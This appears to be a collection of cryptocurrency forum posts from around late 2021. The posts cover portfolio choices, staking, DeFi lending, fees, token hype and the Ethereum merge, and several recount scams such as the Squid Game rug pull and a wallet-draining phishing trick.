Has anyone else consolidated their underperforming crypto from 2017?  I'm considering converting the ones that haven't surpassed their 2017/2018 all time highs into ETH.  That way, I can simplify my holdings and minimize the number of accounts I manage, freeing up my mental bandwidth to find new opportunities.  

I really dislike the fact that my crypto is spread between so many different wallets and prefer to only hold the ones that are listed on Coinbase or Bittrex.  The risk with converting all of these is that one of them could randomly 10x.  This actually happened with one token that I'd almost completely forgotten about because it was such a negligible amount, but it was still a very nice surprise.  

So, to all the "older" traders from 2017, how have you rebalanced your portfolio since then?  

Would you roll these into ETH?

* OMG
* NGC
* PROPS
* SALT
* LPT
* PAY
* BDG
* EVO

Another thought is that I can remove these crypto from my portfolio app, so I don't have to see them every time I login, but then I worry that I'll forget about them.  :)

A website leaked that Tesla could accept soon SHIB as a payment method.

The meme token has gained about 800% in October, but the future of SHIB still seems very unpredictable. 

What do you think about all this? 

Personally, I believe the hype will die down very soon, making SHIBA valuable for quick gains only. 

Important to mention that Elon Musk doesnt own any SHIB tokens

Two years ago I jumped into the Crypto world with a 5k investment on ADA, ETH, BTC. In the following months I made the mistake to always check the ups and downs, and so I sold/buy many times, always et the wrong moment. Result: I now have still 5K, exactly like two years ago. My takeout: don't look at the oscillations, and always HOLD.

Hello all,

I am getting very close to my personal retirement goal, and need advice about structuring the actual withdrawal of income. For discussion's sake, let's say that the "4% rule" covers my income needs. But HOW do I actually withdraw the money? 

Most of my stack is ETH and LINK, both of which can be staked, and are currently on major exchanges. I guess it's as simple as a schedule of: "Keep everything staked, and every X months: convert to USD, withdraw to bank account, pay taxes"? Are there other considerations? Has someone written up a good guide online? Are there financial planners who specialise in this sort of thing? Does anyone have personal experience and is willing to PM me (from a throwaway account for security's sake)? Is there a better subreddit to ask this question?

It's an exciting juncture and I appreciate any advice you may have.
-------------------------------

I first found out about Bitcoin while on a deployment overseas.  An officer I was working with told me whatever I do, get in now.  When I did some research, every article I read said BTC was a scam.

I finally started investing in Cryptos this January.  I started in ETH, BNT, and ALGO based off of some serious research.  Then when I reached out to this subreddit, people were telling me these coins were scams as well.  "ETH isn't BTC", "ALGO is offering 7% APY, an obvious scam", etc etc.

I got into DOGE at $.007 with 100,000 coins.  It hit $0.02 and a close friend told me it's an ATH and will never go above that because it's a meme coin and a scam.  I sold and made a minimal profit.  I would currently have $27k had I not pulled out.

More recently, I have put money into Shiba Inu and PlayDapp.  I was told both of these are scams.  Well, I've doubled my money in PlayDapp and my Shiba is up tenfold.

I have learned a lot of hard lessons this year about Crypto and really about investing in general.  Do your research and you will have more faith when you buy.  And when someone says "this is a scam" and offers little to no rationale, take it with a grain of salt.  Most importantly, fear runs the markets.  Don't let fear run you.

I've been in the space since bitcoin began (Didn't invest until much later though fml)

I remember back in the day having literally just one cryptocurrency. Then came along Ethereum.

The thing is I don't really remember a time where Ethereum was truly considered a shitcoin. It was always advertised as a "different but just as important tool" in the space.

But obviously the space today is so much larger, which begs me to ask the question, what makes a coin a shitcoin?

And while considered one, what allows the coin to transition out of the shitcoin phase if it starts (or like Bitcoin cash ends up there later)?

Is it truly fundementals? Or maybe enough hype can drive it past? (all the doggy coins, and some can make a case they aren't a shitcoin anymore even if I believe they still are).

This might be the dumbest question ever, I don't know. 

I am not super new to cryptocurrencies, I hold a few thousand here and there in various tokens.

One question I have is how do people like the ones who created Squid Game token in the space of a few weeks just create a new cryptocurrency? From the release of the series to the release of the token was only a few weeks it seems. 

Surely it's more difficult than a few weeks work, no? How do they create an entire cryptocurrency within a few weeks? 

It's surreal to me.

Crypto is my only life savings, any amount that I can save is invested in Crypto. As a Gen Z there's already little that I can save, so there's no point is saving up 10-20$ p.m on fiat.

The interest I gain from banks are so shit, 1-2% P.A, for 2-5K is nothing, I can't change my life like I do with crypto.

Am I investing more than what I can afford to lose? Yeah, but I have no other choice, it's so tiny that by the time it becomes any considerable amount the inflation would've kicked in and taken most of what I've worked for.

 ETH went to about $4400 in May before crashing down to $1800. It has recovered wonderfully just like the rest of the market. This time its slowly hitting new All Time Highs and staying relatively healthy above $4,000. We could cross $5,000 this week and then it would only be 2X away from $10,000. 

&amp;#x200B;

https://preview.redd.it/11tpayntx6x71.jpg?width=1564&amp;format=pjpg&amp;auto=webp&amp;s=2b1c8a1000c7a589f4df606368b496677ec9d6ba

 I think there will be a lot of sell pressure at 5k. People who bought early may take some profits. Ethereum has outperformed a lot of altcoins and its up over 50X since the market cycle bottom of around $80. Imagine how high ETH would go once ETH 2.0 launches.

MOONvember is here.

Bears are getting rekt.

5 figure ETH is coming.

What are your price targets for ETH this market cycle?

and what do you think will happen first 10k ETH or 100k BTC?

Hi all,

Relatively new to crypto and I noticed that on coinmarketcap, LRC has 96% circulating supply. Now I can clearly read it just mentions 96% are in public hands and circulating the market. My question is, what happens when this hits 100%? Where is / what is the remaining 4%? If I place a buy order now for 10 LRC, does it come from the 4% or does it purchase from someone selling them to me (thus remaining in the 96% group). I guess I am wondering what the implications / results of reaching 100% circulating supply might be. Are the 4% "mined" and available for purchase? What if LRC hits 100% circulating supply this week and THEN the partnership is announced? Is it just a simple supply and demand curve, similar to locking the float down on a stock?

Thanks!

This is probably an unpopular opinion, but i think all this metaverse/ Crypto game suck big time, the gameplay is completly trash.  


Maybe this is because i actually come from the original PC gaming community but this crypto gaming space IMO is overvalued because the game dont bring anything in terms of gameplay, graphics.   


I dont know but all those game feel like 2005 FLASH game that you can play on shitty gaming website.  


THIS IS NOT FA AND I DO THINK THAT THE CRYPTOGAMING/VERSE WILL KEEP ON PUMPING

There has been lots of talk lately about how a certain m coin will soon be moved off testnet and be listed on exchanges. As a hodler myself, Im excited for this as much as anyone else, but you should know that this is very bearish in the short term. 

Exchange listings are often catalysts for big price spikes. This is because it gives people a new opportunity to buy the coin. However, in this case, it also gives all of us subreddit users a new opportunity to sell them. This is so different from normal listings because for most people, if they own a coin, they bought it on an exchange and can sell it on the same exchange. For this m coin, most of us havent bought the moons we own, and selling them is too much work. 

More evidence of this is the daily volume. Im not a whale by any means, but if I sold my stack right now, it would be a whole 1% of the daily volume, enough to drop the price significantly. 

To be clear, I believe this is bullish for the coin in the long run because its the next step towards more functionality, but this is just a warning to expect a significant price dip immediately upon the first real listing.

Hey.  I'm just getting started buying some crypto, and interested in mostly long term investing, similar to as if it were a 401k or so. So far, I'm starting off with BTC, ETH, and Algo, split just about evenly into each.  

Any other coins I should look into, or should I transfer some from one into another? Those seemed like it was the safest from what I have been looking into for long term.

 Also, I'm not that interested in memecoins unless im able to get in early and out quickly with profit.

Thanks

# What is it?

Chiliz is one of the most famous blockchains for esports and game crowdfunding. Chiliz is a token designed to allow fans to support their favorite sports teams through blockchain-based interactions. The Socios.com platform also aims to allow fans to purchase tokenized voting rights for the teams they support. The Juventus football club was the first to launch a fan token through the Socios.com website. Since then, more than a hundred different teams have joined the platform. Chilliz has attracted the attention of investors from a wide range of sports, including football, basketball and esports teams. Once they have purchased their Fan Token, the supporter can help the club in a series of decisions, be they technical or otherwise. Juventus, for example, provided the holders of their token with various questionnaires through which they would have to choose elements such as the graphics of the coach, or the colors and type of their team's home shirt.  Furthermore, apart from these decisions to which the fan is called, the app allows you to follow the increase / decrease in the value of the tokens in your possession, and then decide whether to buy more or sell them, in line with the type of decisions made. with other cryptocurrencies in the most classic exchanges.  From the point of view of the clubs, however, the system devised by Socios / Chiliz allows companies to be closer to the potential of the blockchain and the network in general. Without forgetting, of course, the income from the sale of tokens, which goes positively to the financial statements of the companies themselves.

# How does it work?

Based on the Ethereum protocol, Chiliz (CHZ) is an ERC20 utility token, a leader in sports tokenization.  CHZ token serves as a digital currency for the Chiliz.net and Socios.com platform which allow football fans to purchase Chiliz tokens and trade them on these platforms and then use them as fan tokens. Another feature of Chiliz is that its supply is limited and its tokens are fungible. The Chiliz blockchain infrastructure uses the **Proof of Authority (POA)** consensus mechanism, an evolution of the Proof of Work (PoW).  While with PoW network nodes have to solve mathematical problems to validate blocks, POA is less computationally intensive. This is because, unlike Pow, it uses a set of "authorities", ie nodes that are explicitly authorized to create new blocks and secure the blockchain.  The Socios platform runs on two different blockchains: an authorized sidechain and the main Ethereum blockchain. Using an authorized sidechain provides superior security for Chiliz.

# Where to store it?

The best hot wallet for CHZ are ZenGo, TrustWallet or Atomic Wallet. If you want more security, a cold storage like Ledger or Trezor is the right choice.

# Pros&amp;Cons

\*DISCLAIMER\* These lists are subjective, it depends from person to person

**Pros**

1. Innovative and fast blockchain
2. Probably the best project in the "fan token" sector
3. Possibility to interact with your favourite team

**Cons**

1. More volatile than other cryptos
2. Price of token determined by sports performance

I joined crypto in 2017 and made great gains so far. Never life changing, but still great. I am really into the tech as an software engineer. I was, like most of you, totally addicted to crypto. I used to watch several youtubers guessing price developments every day( almost no major youtuber has a technical background). 
But last week a simple question came to my mind. Is it all totally overvalued? If you compare the usecase to the current market cap.  almost no coin or token has a usecase and adoption big enough to justify these crazy valuation. 
Most people in the market are in the market, because there are some unbelievable gains. Even if most investors lose money. Many people dont understand the tech and the use of certain tokens or coins. 
I mean that wasnt new to me, but i decided for myself to be careful and sold most of my portfolio. I wish you all that those crazy gains continue, but i started to doubt the future i imagined over the last few years. 
What fo you think? Is the market overvalued?

Euphoria and playful anticipation is the theme of the day - Defichain will make shares for companies accessible to everyone, no matter where they live or who they are!! One third of all adults do not have a bank account, they can now participate in the global financial market. Now even a child in a third world country without a passport could buy stocks listed on NASDAQ.

Get ready for decentralized stocks and a user experience a child could master.

Get ready for the utility coin DFI to skyrocket as it is needed as collateral for the decentralized stocks !

One thing Id like to be better at is identifying coins in the gaming space that are heating up, any tips or advice? See below for some examples of things that took off recently. Looking to do my own research but dont really know where to even start to find these coins to research them.

(This is from a daily newsletter I receive and not my own words)

YooShi rallied 619% in one week from a low of $0.00000057 to its all-time high of $0.0000041 on October 30th.

The altcoin has corrected since and is now exchanging hands at $0.0000034.

Next up is MANA, the native asset of blockchain-based virtual reality platform Decentraland. In seven days, MANA skyrocketed 448% from a low of $0.75 to a fresh all-time high of $4.11 on October 31st.

The gaming token StarLink (STARL), which is designed to allow players to earn digital assets as they travel through a virtual universe and complete tasks, is in the midst of a rapid rise.

The 190th-ranked altcoin exploded from a seven-day low of $0.000015 to a fresh all-time high of $0.000064, representing gains of 326% in just one week.

Meanwhile, The Sandbox (SAND), another player-powered online world that allows gamers to sell virtual assets in an online marketplace, has soared 232% in the last seven days.

Many users of this sub are involved in more than just keeping their crypto on an exchange. Many are involved in some of the basics of using DeFi like using a DEX (decentralized exchange like pancakeswap). Fewer are involved in the world of defi lending involving sites like AAVe and Compound.

**How Lending Works**

* You "stake" your coins on the appropriate website. 
* Your staked coins then act as collateral which allows you to borrow a percentage of the amount that you lent, typically 40-60%.
* You can then re-lend that crypto that you borrow against yourself.
* You typically get a percentage for lending in the lending currency and the platform often provides an additional "bonus" in their own crypto.
* When you borrow you pay a percentage in the borrowed currency, but some platforms also give their native crypto for borrowing
* Lending protocols usually make their money on the spread, the difference between the lend and borrow rate

**Risks of Lending**

* What I described above is a form of leverage. It is a less risky form and typically less than 1X leverage, but it is one none the less.
* If your principal value falls below a certain percentage compared to your loan, it can be liquidated to cover your loan. Staking stablecoins as your principle can make this unlikely
* A collapse of Tether or a market crash would likely cause chaos that would crash defi
* Most of the hacks that you hear about are lending protocols. Compound is thought of being pretty secure, but forks of Compound like Cream have had hacks lately.

**Good Opportunity to Try Lending**

* Harmony ONE's first lending protocol just was released two days ago, Tranquil Finance
* They are offering very good incentives initially to lend and borrow on their protocol
* The gas fees on Harmony ONE are so low that you can experiment with $1 
* Lending and borrowing is generally boring and is not most people's cup of tea.
* The risks of using a protocol like this are higher than using a platform like a centralized exchange

Sent BNB to a BSC Wallet

Wondering how screwed I am. Bought BNB on crypto.com, and trying to send it to trust wallet. Accidentally copied my trust Wallet BSC address (since that what I ultimately have to convert it to to use on pancakeswap) and sent the BNB to my BSC Wallet. Im hoping the transaction will just fail, and Ill be charged the gas fee. But might this transaction go through? Or is there anyways to stop it before it does? Thanks for any info!

Hopefully Im at the character count, because I dont really have anything more to say. Pretty much summed it up in the first paragraph. Anyways. Thanks

There are alot of posts at the moment mainly about big losses because of the squid game scam. So let's flip it and see what people's big gains were in this community. I'm also just interested in how much people can make in this game. I have literally a few hundred in algo so so far my biggest gains are a few coins off yieldy and tinyman, I know what you're thinking and I have already picked the colour for my lambo.

 I just want to know if people got lucky with any moon shots and how much you made, if not comfortable giving the actual figure just give it in percentage made.

I've been reading a lot about how blockchain is essentially a new type of database. Currently there are like 5 companies that control the entire internet because they have everyone's data. This obviously isn't ideal, and blockchain is pitched as a solution to this problem (among others) where ownership of data is returned to the users.

This is a really exciting idea, but the part I can't wrap my head around is how exactly blockchain is going to replace traditional sql databases when all of the data is basically public to all the nodes? Take for example Chase bank. I wouldn't want all of my banking information being open and public to all the nodes on the blockchain. Currently my data is only visible to their centralized server. Which has it's own drawbacks, but it's better than my data being available to 1,000 nodes. 

Am I misunderstanding this? Does blockchain have an answer to this confidentiality problem that I'm just not aware of? Or does blockchain just not make sense in the context of sensitive user data?

So apparently there is a new way of marketing, it is called: **baiting the \*\*\*\* out of people.** 

If you don't know how this works, here's a textbook example Ocean Protocol pulled today:

Yesterday they tweeted some vague video of a Tesla racing around:

[Video they posted of an obvious Tesla riding around](https://preview.redd.it/fs4dkfr9t6x71.png?width=602&amp;format=png&amp;auto=webp&amp;s=48d1bf45e085f6c246c607e3ef713b6b15932e0e)

And the video ends with "**COMING SOON**", tricking people into thinking they are going to announce a Tesla partnership. Multiple replies have the same photoshopped picture of Elon Musk with an Ocean protocol t-shirt on. 

 Ofcourse, *the sheeple we are*, people buy it *and literally buy it*. So prices yeet upwards:

[Ocean touching the sky after days\/weeks of same price range \(source: CMC\)](https://preview.redd.it/v92zw4eot6x71.png?width=525&amp;format=png&amp;auto=webp&amp;s=6d5e4a0f2a4473ea01fe34996be3e4aa7a77e10c)

**TURNS OUT** they did not have a tesla partnership but they partnered with some random small IoT device company. Who could have thunken it! 

Ofcourse people are now upset because they bought at ATH... But don't worry, **Ocean protocol will just hide your comment:**

[One of many examples, seriously look it up](https://preview.redd.it/yzhx4geku6x71.png?width=1188&amp;format=png&amp;auto=webp&amp;s=076b319467827d0b2856997330355d73bb01c2ef)

This concludes the textbook example of "*How to Pump with False Advertising*". 

Hope you learned something!

The following guide explores and compares the biggest Ethereum rivals that are playing a part in driving innovation in the crypto sphere - Cardano (ADA), Solana (SOL), Harmony (ONE), Polkadot (DOT): [The Biggest Ethereum Rivals](https://www.oobit.com/blog/the-biggest-ethereum-rivals/)

All these networks provide a platform to build dapps and smart contracts. This provides the resources for developers of all fields to create, build and launch projects that harness blockchain technology. They all attempted to resolve at least one of Ethereum issues  in terms of latency, high gas fees, scalability issues as well as a relatively disliked programming language.

In 2018 I cashed out the majority (95%) of my crypto assets at peak.  Not enough to make me rich at the time but enough that was it life changing.  The problem is I could have just cashed out half and that would have been plenty of money at the time. Today those assets would have been worth x5-10 (btc) what they were worth (wayyy more for the 2 million dogecoin I dumped in 2018, sigh).  

I will never cash out most of my holdings again.  I had thought about buying back some eth several times but chickened out after thinking that eth would never go above 500 again after seeing it sit at 200-300 for years.  I am dedicated to crypto more long term now (10+ years).  I might take some profit this year as the bull run continues but all that money will be used to rebuy the dip later.  I guess we'll see how things go, but I'll never sell more than half at once again.

I bet bitcoin is the most expensive crypto now and it will be for a long time I predict. This high price in bitcoin might be because bitcoin is like the first crypto created (I stand to be corrected). With more projects coming up on a regular basis, is it possible for an alt coin to overtake bitcoin price and dominance or does Bitcoin remain the crypto King. In terms of use case bitcoin is still limited  compared to new projects in the market, a lot of users prefer investing in it because it has offered a higher return than gold, stocks over the years.  So I dare to say that anything is possible it might not happen now but we have years to see if the Crypto King will be overthrown. 

&amp;#x200B;

PS : ETH might be a likely contender but it is still below $5k...

Hi! So im quite new to crypto and investing in general

I just want to understand how much money crypto.com take when you sell a coin and withdraw to Fiat Wallet. I invested in ELON and it went up 26% i think, id about what was worth 10, but it Said if i withdraw i would have 7 euro ish

Now, as i thought, the ELON went down and i would have bought again today. I didnt because of fees ig, and now i have about 6 euro worth of ELON.

What would you have done in my situation? Any advice is appreciated!

PS: my actual bank currency is DKK, and idk if thats why

Just had a discussion this morning with a buddy fantasizing about 'can you imagine if Loopring went to the same value as Bitcoin' (he got in around the $0.72 market and says he's never selling!).

Which was absolutely unbelievable to me cuss this guy is a banker. Like he is heavily invested in the stock market, doles out million dollar loans as an occupation and yet he doesn't understand a market cap? I just couldn't believe it.

&amp;#x200B;

As per [The Coin Perspective](https://thecoinperspective.com/compare/loopring):

If Loopring had Bitcoin's market cap of $1.2T, 1 LRC would be worth $957.32, an upside of 703x

Loopring is sitting around 1.36 right now, it would need to go up 703 times. I can't stress enough how highly unlikely this is. 

Ah well, I guess I should just shut up and let the guy dream.

Hey Guys,

I had posted on this thread yesterday for this issue I was having. This dude from the screenshot dmed me 'trying to help'. There were few but I was skeptical. The guy tricked me into troubleshooting my problems and lured me to basically enter my secret key on the website. I was stupid enough to fall for it. I actually had a prompt reaction, right after I pasted my key to generate a QR code, I realized something isn't right. I tried to fake my keys a little bit by telling him that the keys are invalid and i kept on changing the order of the keys and submitting them to generate QR. But, the first one was legit. 

&amp;#x200B;

Lost a lot of money for no reason. I was having trouble taking out money from pankcakeswap the first place. If you check my other posts, I was able to buy with bnb but not sell. This scammer basically drain all my money out in a matter of a minute. Just had to watch my money drain to 0. Fucking sucks. Just wanted to aware people that such people exists. I should not have talked but I was desperately looking for solutions as no one had answers.

If you see the conv, he actually made me think about something was not right and lured me to use that website to revalidate. I actually thought that was the case because of the problems that I was having.

Here is the website this fucker sent me. He deleted the link from the chat but I had it on my browser history:

[https://dapps-iconnect.com/](https://dapps-iconnect.com/)

If someone can bring this shit down, I would appreciate it. What can be done besides deleting my wallet now?

I've seen lots of talk about BAT and Brave lately here so I wanted to add my experience. BAT is a token built around Brave. A safe, secure web browser just like chrome but with a build-in add blocker to simplify the concept. With time Brave added lots of functions focused on cryptos, like the build-in wallet, or more on the privacy part. Like their search engine.

 Now enough with the browser, let's speak about the coin. 

Well, the economy of BAT is built around advertising. You, as a user of Brave, can opt-in for sponsored ads, and for each ad, you get paid in BAT vice versa, if you have a business or company you can advertise on Brave paying for the service. If I'm not wrong users get 30% of what companies pay. These are the basics, really really simplified.  
With timeBAT grew a lot in adoption as you can see [here](https://bravebat.info/), and during the last bull run it reached its ATH at around 1.80 for later on to collapse around 0.80. There wore some lucky people that gained lots of coins and made a good profit. 

&amp;#x200B;

But in the end, the project is rock solid, a very user concentrated application, huge adoption, and the team is working hard to add new stuff.

&amp;#x200B;

In this sub there are so many discussions about really good performing coins, solid projects or coins with a great potential. These are the ones that can give you a nice profit over a long time and you surely want to hold in your wallet.

After the recent rugpull of Squid I am curious which was your worst performing coin (or have you even been rugpulled?) Which coin screwed you the most?

Mine is: ICP (bought at $380, sold at $100) Loss: 72%

Could be worse but my wallet needed quite a bit of time till it recovered.

A cryptocurrency that was inspired by the hit Netflix (Nasdaq: NFLX) show Squid Game skyrocketed by more than 2,000% in a few days. On Monday, the coin's price plummeted with its creators closing the project and making off with $2.1 million from investors.

History: The Squid Game coin, which was not affiliated with the show, launched on October 26.

Red Flags: Despite the hype, there were plenty of red flags that pointed to the coin being a scam. This includes a website filled with spelling and grammatical errors, social media pages that prohibited responses, and an inability for traders to sell the coins, according to Gizmodo.

Collapse: After shooting up to a price of $2,800 in the early morning hours on Monday, the price quickly fell to less than 1 cent in a matter of minutes. This type of market manipulation is referred to as a rug pull in cryptocurrency.

Aftermath: The creators of the coin have since left and all social media accounts appear to be disconnected.

Final Thoughts: Hopefully, this serves as a lesson on why you should research before jumping on the next big meme coin.

Ive realized that my entire crypto portfolio is a complete mess. I need some structure. My days of got a hunch? Bet a bunch! are over. 

Is there anyone on here who can point me in the right direction? Im looking for websites, newsletters, anything to learn about new and existing projects. Is there any reputable people with knowledge in the space on YouTube?

Ive stumbled upon messari and see they offer enterprise and was curious if any one has used that and what they think about it. 

Any other places to expand my crypto knowledge would be appreciated.

I love crypto at the moment, because its chaotic. 

Tokens are running wild. Great things like aave, sushi, etc. these are amazing projects in their own right. 

But there is an onslaught of other things. There is a war. ETH, back when it launched, was revolutionary. Amazing stuff. 
But today, things have evolved. 
Tons have projects have been inspired by the original Bitcoin code, and the Ethereum code. They have taken this code, and evolved. 
The problem we have is that many many people have invested in BTC, or invested in ETH. And they are locked into these old coins. 
But the future is much more advanced. 
We have lots of factions entering the space. 
ADA and ALGO are new and advanced projects. They are standing on the shoulders of giants. Old giants. And BTC and ETH are old bygone tech. 
Sure, they are reliable. In the way that oil is a reliable resource. 
But its obvious that ETH is the most detrimental and caustic crypto. The transaction fees are utterly absurd. 
It can not scale. 
Sure, the eth moonboys will tell you that ETH2.0 is the solution. But has no projected love date. 
So ETH is now dragging and slowing down the universe of crypto. 
We all want nfts. We all want defi. But ETH is killing this. The transaction fees are absurd. 
I want to buy a emoji? Ok, its 30$. Great. But the gas is 250$!
This is killing crypto. 
Any nuubes trying to enter crypto at the moment are being kneecapped and destroyed. 
And so we have projects like BSC, and pancakeswap. Disconnected from eth. Gleefully. 
And Ada is creating a defi, with sundaeswap. And algo is creating a defi with tiny man. 
All crypto is diverging. 
Because BTC and ETH are old surpassed tech. 
And this is good. 
Evolution works with surpassing technology. 

And at the moment, we have super great things. 
Please check out pancakeswap. 
Check sundaeswap. 
Check osmosis. 
Check sushiswap. 
These are the real game changers. 
These are the projects that are going to surpass ETH. Thankfully. Its evolution baby.

Four crypto assets are erupting this week as play-to-earn gaming projects outshine Bitcoin (BTC), Ethereum (ETH) and the broader crypto markets.

One of the top gainers from the last seven days is YooShi (YOOSHI), the native asset of a play-to-earn gaming ecosystem built on Binance Smart Chain (BSC).

Data from CoinGecko shows that YooShi rallied 619% in one week from a low of $0.00000057 to its all-time high of $0.0000041 on October 30th.

The altcoin has corrected since and is now exchanging hands at $0.0000034.

Next up is MANA, the native asset of blockchain-based virtual reality platform Decentraland. In seven days, MANA skyrocketed 448% from a low of $0.75 to a fresh all-time high of $4.11 on October 31st.

Decentraland recently launched a play-to-earn incubator to support new games looking to integrate with the platforms metaverse

The gaming token StarLink (STARL), which is designed to allow players to earn digital assets as they travel through a virtual universe and complete tasks, is in the midst of a rapid rise.

The 190th-ranked altcoin exploded from a seven-day low of $0.000015 to a fresh all-time high of $0.000064, representing gains of 326% in just one week.

Meanwhile, The Sandbox (SAND), another player-powered online world that allows gamers to sell virtual assets in an online marketplace, has soared 232% in the last seven days.

The Hong Kong-based gaming platform just raised $93 million in an investment round led by SoftBank, according to a new report from Reuters.

Everyone coming to this sub as a new crypto investor will most definitely face some difficulties. 

Scammers will always dm you trying to help you if you have any trouble. Don't answer to them. Ignore them.

Furthermore, sometimes you will deal with assholes spreading negativity and FUD. If you are not aware of them, things for you can get really bad. Ignore them.

On the other hand we have shillers who have gambled their money on most likely a coin with an outrageously stupid name and will post several things trying to persuade unexperienced investors like you to join their trip to poverty. Ignore them.

Another thing that can be really helpful for you and you probably didn't know is that you can earn crypto daily with many ways. Of course small amounts of money but if you live in a third world country it can be huge long term. 

One simple way is to use the brave browser to earn Basic Attention Token (BAT). 

Another one is by staking your coins. You can stake them on multiple exchanges.

Feel free to ask questions if you are a newbie or give advice if you think you can be helpful! I am sure there are many more things to share for advice so please go ahead.

So today I heard the first time of Loopring and damn that sounds like an amazing project. 

No Gas Fees, really fast transfers and no delays.

This really sounds like a good project with a massive potential.

But: Why did it went down so massively in 2018 and never recovered since then?  
It's ATH is still back from January 2018 standing at $2.122 and waiting to be broken. Why didn't it recover earlier and went back up?

Is it because it wasn't on major exchanges and just overlooked?  It's featured on Coinbase since September 2020 and the price never really reacted to that listing. 

(I know in 2018 the whole market took a massive hit but why didn't it recover earlier?)

Ive been tiptoeing into the crypto pool for 2 years or so. I bought into Doge so that I could give my kids something that sounded more substantial for doing chores. When it was $0.002513, Id give them 100 Doge for picking up their rooms, or doing the dishes, that kind of thing. 

Then it took off. I sold a little so that now all of the Doge is free and we can hang onto it to see what happens to it. 

Since Im not interested in giving my kids $25 to unload the dishwasher, I needed a new coin. I bought Shib when it was available on WeBull. It also went up, but I can still give 100 Shib to the kids. 

This got me more interested in crypto. But there are So. Many. Coins. When Squib did its buyers dirty, everyone said it was in the white paper. But with so many different crypto, how do you all find one to invest in?

Is there some kind of screener to use to separate out more useful crypto from the meme crypto? (I realize the irony involved since I mentioned that I bought Doge and Shib.)

Thanks!

The merge will immediately solve all the fee issues right??

Short answer, it doesn't.

Some history

The sentiment that the merge will solve scaling issues is old and now outdated. Originally the PoS chain was intended to get sharding before the merge occurs, putting the merge date most likely in 2023 sometime. However, due to pressure from miners, especially around EIP1559, it was decided to do a minimum viable merge without sharding. 

Sharding is the piece that significantly increases throughout and drops transaction fees (note that I am referring to data and executable shards together, but both should have improvements to fees -data sharding should make it possible to increase the gas limit safely) So originally, yes, ETH2 would drop fees significantly. ETH2 would include sharding and PoS at the same time. But now that the merge was pushed up ahead of sharding, the merge itself won't solve the scaling issues.

ETH2 was intended to be a big update that solves all the issues, but it has been split up and re-arranged. For some reason the name ETH2 stuck and some people use it to refer to the merge and some people use it (more appropriately) to refer to after the merge when sharding is added amongst other updates like stateless clients.

The PoS merge will not solve the scaling issues. There is a 9% throughput increase, but that will be hardly noticable in day to day. Sharding will solve these issues, but it that isnt coming until around 2023 and layer 2s/rollups will help with this. These are here now.

Rollups and layer 2s are meant to be a long term solution. They are here now, but still in their infancy. Once major exchanges start enabling withdrawals on these different layer 2s and smart contracts continue building out their contracts, we should see these explode in use.

So please, if you see people posting that the merge will solve the scaling issues, politely inform them that sharding and layer 2s will do this, not the merge.

If you see people using the term "ETH2," especially if they use it in reference to the merge, politely let them know that ETH2 is an outdated term and we should be using the terms merge or sharding to be more accurate and less confusing to those who aren't aware.

People had a similar misconception that EIP1559 would significantly decrease fees and I want to avoid that for the merge.

I have this discussion with my uncle.

In his eyes, he thinks it's wiser to invest in cheap altcoins.

Cheap as below $1 coin.

His argument is that it's easier for cheap altcoins to fold than expensive altcoins ( like Ethereum ) to fold.

He said he will hold Shib, VET, HBAT, ZIL than Solana, Ethereum, LINK.

Wherever I tell him Solana, Chainlink are great projects, he will says things like how much money can you make from them compare with the cheap altcoins he bought.

Is price the only factor you look into when purchasing coins?

Would you buy coins because it's cheap?

With such an overwhelming increase in digital asset volume, having a digital asset management system is essential.

None of my crypto friends are using one and I thought it would be helpful for some of you guys to know the benefits of having one. 

1. You can keep track of fees to avoid overpaying

Whether you realize it or not, even what seems like small fees do add up and can significantly reduce your ability to build wealth over time. Of course, this is not just a problem that affects the wealthy.

1. Stay on top of renewal rates

Keep important subscriptions or memberships from lapsing and ruining your gains  or keep the ones you meant to cancel from restarting and cutting into those precious gains.

1. Avoid duplication of assets

The single biggest disaster facing portfolio managers, accountants and anyone who deals with assets is duplicate assets. Whether its a bad investment or a bad attempt at a solution to a problem, the effect is the same: a waste of time and money to try to fix it.

Also, [here](https://www.kubera.com/blog/digital-asset-management?utm_source=reddit&amp;utm_medium=cryptocurrency)s a cool resource on digital asset management if you want to check it out.

How many of you have a digital asset management system in place?

What benefits have you noticed from implementing this?

Im very interested in a game called [Genopets](https://www.genopets.me). As far as I understood, Genopets is the first move-to-earn NFT game and its powered by Solana. You basically progress your pet by moving and doing physical activity, which is very cool compared to other NFT games.

I was thinking about using my passport to participate fo verify my identity for the token sale but Im kinda nervous. What if this whole thing isnt legit? It all seems very well-thought and legit but the internet is scary and I could be brainwashed lol.

Newer to crypto and I see many articles and posts about strategies. The one I want to do long term is throw in what I can every couple weeks, maybe a couple hundred bucks, and split it between things like a heavier percentage of BTC and ETH, a little in things like SOL/ADA (still researching), and a little here and there on some good projects I believe in and like (stuff like ALGO, LINK, HBAR, VET). I also want to treat it like a 401k and kind of forget about it for a while except to just keep adding slowly to my positions. I know nothing is certain, and this can all crash down at any point, but medium-long term (say the next 10-15 years), if I put a few hundred every month, and DCA with the above strategy, what are people's guesses of that succeeding in not making me rich, but just performing better than a traditional 401k? My main goal is to just be able to retire earlier.

I have a 401k and take full advantage of the company match, but have always done more than that (double currently). Thinking of just doing the minimum for the match and using the extra, plus whatever else I can afford, to throw into the above strategy and wondering people's best guesses on how likely that is to perform better (or worse) than just throwing as much as possible into the 401k that is basically just safer mutual funds.

I've been holding Eth for a while now , it keeps going up breaking new all time highs but it is rarely mentioned anymore. A few months back ETH was basically all we talked about, but now that it is at its all time high with no signs of stopping , no one even mentions it.

We are all focused on finding the next shitcoin to 100x that we completely forgot about Ethereum .

Thanks to this sub Eth is major of my holdings, was kind of disappointed not to see this sub flooded with Eth posts.

Ethereum now has a market cap of $525 billion . Last year this day , the price of eth was $396 . Eth has come a long way since then. Its great to see a crypto with value go up . Projects like Eth is what makes the crypto space valuable .

A well deserved pump for Eth .

Congratulations Eth holders !

I already have a little of my crypto staked. In case it helps anyone else out, heres what Ive got: 

Exodus wallet:
ATOM (~10%)
ALGO (~4.7%)
ADA (~4.9%)

This is a small portion of my holdings, and I keep everything else spread out between multiple wallets/exchanges to avoid losing crypto to hackers. What Id like to do next is put some of my savings into a stable coin that offers a good rate for staking. Something to help diversify my portfolio and put me at less risk in the event that my other crypto dumps. So here are a few questions: 

1. Ive seen a lot of hate for USDT here. Id like to know why people dont like it? 

2. Stable coin recommendations, best place to stake, and for how much? 

3. Any other crypto recommendations for high staking rewards? 

4. I know there are risks to staking, but dont quite understand them. Can someone explain the chances of losing crypto when staking? (Slashing???)

Im in the US, but feel free to offer advice that may help others as well. 

I do a bit of my own research, but also like to hear from others.

